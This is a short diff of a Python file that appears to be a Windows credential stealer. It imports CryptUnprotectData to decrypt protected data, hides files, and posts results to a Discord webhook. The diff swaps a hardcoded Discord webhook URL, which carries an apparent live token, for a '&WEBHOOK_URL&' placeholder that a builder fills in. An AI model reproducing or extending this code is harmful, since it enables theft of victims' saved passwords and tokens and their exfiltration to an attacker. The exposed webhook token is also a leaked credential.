@@ -30,7 +30,7 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1093274628060872714/NNnvGAbk7L3ypi4bwUIPSK-h9o5LRPY-5VTdWGEzZj-J4uww9O0Q222D6qY1O_6xOdNz"
+WEBHOOK_URL = "&WEBHOOK_URL&"
 
 def main(webhook_url):
 	global webhook, embed
